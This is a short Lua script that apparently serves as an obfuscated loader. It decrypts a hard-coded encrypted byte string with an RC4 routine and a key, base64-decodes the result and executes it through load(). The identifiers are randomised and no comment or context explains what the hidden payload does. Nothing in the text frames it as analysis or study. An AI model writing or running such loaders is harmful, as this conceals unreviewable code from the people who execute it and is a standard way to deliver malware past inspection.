local Mo4nOzRY = "\234\100\186\190\004\031\130\101\015\236\087\214\061\207\005\125\222\232\014\031\149\244\079\085\209\138\250\066\008\225\111\173\189\143\252\022\201\166\013\119\072\225\038\113\098\186\189\071\162\253\191\175\161\232\208\199\228\022\153\038\218\131\161\072\079\087\036\199\028\193\037\032\165\060\182\080\029\171\071\022\191\012\064\179\021\133\173\029\193\236\148\040\065\064\057\051\215\004\173\235\091\075\071\095\198\181\148\033\035\122\107\170\002\107\117\184\244\072\141\250\150\205\174\116\204\116\104\086\044\004\069\237\242\073\102\018\241\085\108\077\079\183\171\112\016\089\002\069\190\210\198\135\201\152\008\255\153\212\137\168\120\204\208\088"
local cw2DokWa = "TAIkDsCZvBb3zTLE"
local function CREDhOto(a,b) local p,c=1,0; while a>0 and b>0 do local ra,rb=a%2,b%2; if ra~=rb then c=c+p end; a,b,p=(a-ra)/2,(b-rb)/2,p*2; end; if a<b then a=b end; while a>0 do local ra=a%2; if ra>0 then c=c+p end; a,p=(a-ra)/2,p*2; end; return c; end
local function Yek1ZqHV(d,k)
    local s = {} for i=0,255 do s[i]=i end
    local j=0
    for i=0,255 do
        j=(j+s[i]+string.byte(k,(i%#k)+1))%256
        s[i],s[j]=s[j],s[i]
    end
    local i,out = 0,{}
    j=0
    for idx=1,#d do
        i=(i+1)%256
        j=(j+s[i])%256
        s[i],s[j]=s[j],s[i]
        out[#out+1]=string.char(CREDhOto(string.byte(d,idx),s[(s[i]+s[j])%256]))
    end
    return table.concat(out)
end
local function DnxhkOE9(data)
    local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    data = string.gsub(data, '[^'..b..'=]', '')
    return (data:gsub('.', function(x)
        if (x == '=') then return '' end
        local r,f='',(b:find(x)-1)
        for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
        return r;
    end):gsub('%d%d%d%d%d%d%d%d', function(x)
        local r=0
        for i=1,8 do r=r+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
        return string.char(r)
    end))
end
local ok, err = pcall(function()
    local res = Yek1ZqHV(Mo4nOzRY, cw2DokWa)
    assert(load(DnxhkOE9(res)))()
end)
if not ok then print("SecureError: "..tostring(err)) end